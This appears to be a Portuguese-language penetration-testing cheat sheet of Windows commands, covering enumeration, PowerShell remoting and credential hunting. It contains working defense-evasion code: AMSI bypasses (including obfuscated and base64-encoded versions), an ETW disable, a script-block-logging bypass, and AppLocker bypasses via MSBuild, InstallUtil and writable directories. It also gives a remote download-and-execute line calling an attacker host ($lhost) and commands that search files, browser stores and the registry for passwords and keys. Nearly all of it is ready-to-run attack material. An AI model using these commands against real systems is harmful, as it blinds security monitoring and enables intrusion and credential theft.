# Comandos Windows

## Índice

- [Enumeração de Usuários](#enumeração-de-usuários)
- [Informações do Sistema](#informações-do-sistema)
- [Enumeração de Rede](#enumeração-de-rede)
- [Enumeração de Processos e Serviços](#enumeração-de-processos-e-serviços)
- [Enumeração de Compartilhamentos](#enumeração-de-compartilhamentos)
- [Execução Remota de Comandos](#execução-remota-de-comandos)
- [Cmdlets de Remoting PowerShell](#cmdlets-de-remoting-powershell)
- [Evasão de Defesas](#evasão-de-defesas)
  - [Bypass AMSI](#bypass-amsi)
  - [Bypass ETW](#bypass-etw)
  - [Bypass de Logging de Script Block](#bypass-de-logging-de-script-block)
  - [Bypass AppLocker](#bypass-applocker)
- [Caça a Arquivos](#caça-a-arquivos)

---

## Enumeração de Usuários

### Verificação Rápida (One-liner)

```powershell
# Enumeração rápida do Windows
whoami /all && net user && net localgroup administrators && systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

- Listar usuários locais

    ```shell
    Get-LocalUser
    ```

- Listar usuários do domínio

    ```powershell
    Get-ADUser -Filter *
    ```

- Obter usuário atual

    ```shell
    whoami
    $env:USERNAME
    ```

- Obter grupos do usuário

    ```shell
    whoami /groups
    Get-LocalGroup
    Get-ADGroupMember "Domain Admins"
    ```

---

## Informações do Sistema

```shell
systeminfo
Get-ComputerInfo
```

- Versão do SO

    ```shell
    [System.Environment]::OSVersion
    Get-WmiObject Win32_OperatingSystem
    ```

- Arquitetura

    ```shell
    [System.Environment]::Is64BitOperatingSystem
    $env:PROCESSOR_ARCHITECTURE
    ```

- Hostname

    ```shell
    hostname
    $env:COMPUTERNAME
    ```

- Informações do domínio

    ```shell
    Get-WmiObject Win32_ComputerSystem | Select Domain
    ```

---

## Enumeração de Rede

- Interfaces de rede

    ```shell
    ipconfig /all
    Get-NetIPAddress
    Get-NetIPConfiguration
    ```

- Tabela de roteamento

    ```shell
    route print
    Get-NetRoute
    ```

- Tabela ARP

    ```shell
    arp -a
    Get-NetNeighbor
    ```

- Conexões ativas

    ```shell
    netstat -ano
    Get-NetTCPConnection
    ```

- Cache DNS

    ```shell
    ipconfig /displaydns
    Get-DnsClientCache
    ```

---

## Enumeração de Processos e Serviços

- Listar processos em execução

    ```shell
    Get-Process
    tasklist /v
    ```

- Enumerar serviços do Windows

    ```shell
    Get-Service
    sc query
    ```

- Listar tarefas agendadas

    ```shell
    Get-ScheduledTask
    schtasks /query /fo LIST /v
    ```

- Listar programas na inicialização

    ```shell
    Get-CimInstance Win32_StartupCommand
    wmic startup get caption,command
    ```

---

## Enumeração de Compartilhamentos

- Listar compartilhamentos

    ```shell
    net share
    Get-SmbShare
    Get-WmiObject Win32_Share
    ```

- Acessar compartilhamentos

    ```shell
    net use \\target\share
    Get-SmbMapping
    ```

- Encontrar compartilhamentos acessíveis na rede

    ```shell
    Get-SmbShare -CimSession (Get-ADComputer -Filter *).Name
    ```

---

## Execução Remota de Comandos

- Execução básica de comandos

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock { whoami }
    ```

- Múltiplos comandos

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock { whoami hostname ipconfig }
    ```

- Executar script local em máquina remota

    ```shell
    Invoke-Command -ComputerName $rhost -FilePath .\script.ps1
    ```

- Download e execução

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("http://$lhost/script.ps1")}
    ```

---

## Cmdlets de Remoting PowerShell

- Sessão Remota Interativa

    ```shell
    Enter-PSSession -ComputerName $rhost
    ```

- Encerrar Sessão Remota

    ```shell
    Exit-PSSession
    ```

- Executar Comando Remotamente

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock {cmd}
    ```

- Criar sessão persistente

    ```shell
    $s = New-PSSession -ComputerName $rhost
    ```

- Fechar sessão

    ```shell
    Remove-PSSession -Session $s
    ```

- Listar sessões ativas

    ```shell
    Get-PSSession
    ```

---

## Evasão de Defesas

### Bypass AMSI

> Contornar a Interface de Verificação Antimalware para executar PowerShell malicioso

#### Patch de Memória (One-liner)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### Versão Ofuscada

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

#### Método de Matt Graeber

```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

#### One-liner em Base64

```powershell
powershell -ep bypass -e WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbGBsACwAJAB0AHIAdQBlACkA
```

#### Usando Invisi-Shell

```powershell
# Executar PowerShell sem logging ou AMSI
.\RunWithPathAsAdmin.bat
.\RunWithRegistryNonAdmin.bat
```

---

### Bypass ETW

> Desabilitar Event Tracing for Windows

```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

---

### Bypass de Logging de Script Block

```powershell
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```

---

### Bypass AppLocker

#### Diretórios Comuns para Bypass

```powershell
# Locais graváveis por padrão
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks
C:\Windows\SysWOW64\com\dmp
```

#### Executar a Partir dos Locais de Bypass

```cmd
copy payload.exe C:\Windows\Tasks\
C:\Windows\Tasks\payload.exe
```

#### Bypass com MSBuild

```cmd
# Criar arquivo .csproj com payload embutido
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj
```

#### Bypass com InstallUtil

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

---

## Caça a Arquivos

> Buscar arquivos sensíveis em sistemas Windows

### Buscar Senhas

```cmd
:: Busca recursiva no diretório atual
findstr /si password *.txt *.xml *.ini *.config *.cfg

:: Busca em caminhos específicos
findstr /spin "password" C:\Users\*.* 2>nul
findstr /spin "password" C:\inetpub\*.* 2>nul

:: Busca sem distinção de maiúsculas para múltiplos termos
findstr /si /c:"password" /c:"passwd" /c:"pwd" /c:"secret" *.* 2>nul
```

### Busca de Arquivos com PowerShell

```powershell
# Buscar arquivos contendo senhas
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.config,*.xml -Recurse -ErrorAction SilentlyContinue | 
  Select-String -Pattern "password|passwd|pwd|secret" | Select-Object Path,LineNumber,Line

# Encontrar tipos específicos de arquivo
Get-ChildItem -Path C:\ -Include *.kdbx,*.pfx,*.p12,*.ppk,*.pem -Recurse -ErrorAction SilentlyContinue

# Encontrar arquivos modificados recentemente
Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue | 
  Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)}
```

### Arquivos Sensíveis Comuns

```cmd
:: Encontrar arquivos de configuração
dir /s /b *.config *.ini *.xml *.txt 2>nul | findstr /i "password web.config app.config"

:: Encontrar arquivos de credenciais
dir /s /b C:\Users\*password* C:\Users\*cred* C:\Users\*secret* 2>nul

:: Encontrar chaves SSH
dir /s /b C:\Users\*.ppk C:\Users\id_rsa C:\Users\.ssh 2>nul

:: Encontrar credenciais do navegador
dir /s /b "%APPDATA%\Microsoft\Credentials\*" 2>nul
dir /s /b "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" 2>nul
```

### Busca de Credenciais no Registro

```cmd
:: Buscar senhas no registro
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul

:: Locais comuns de credenciais
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" 2>nul
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>nul
```

---

## Veja Também

- **[Comandos Linux](Linux-command.md)** - Comandos de sistema Linux
- **[Reverse Shell](Reverse-Shell.md)** - Payloads de shell para Windows e Linux
- **[Escalação de Privilégios Windows](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Técnicas de privesc no Windows
- **[Exploração AD](../3.AD-Exploit/3.1.AD-Exploitation.md)** - Ataques ao Active Directory
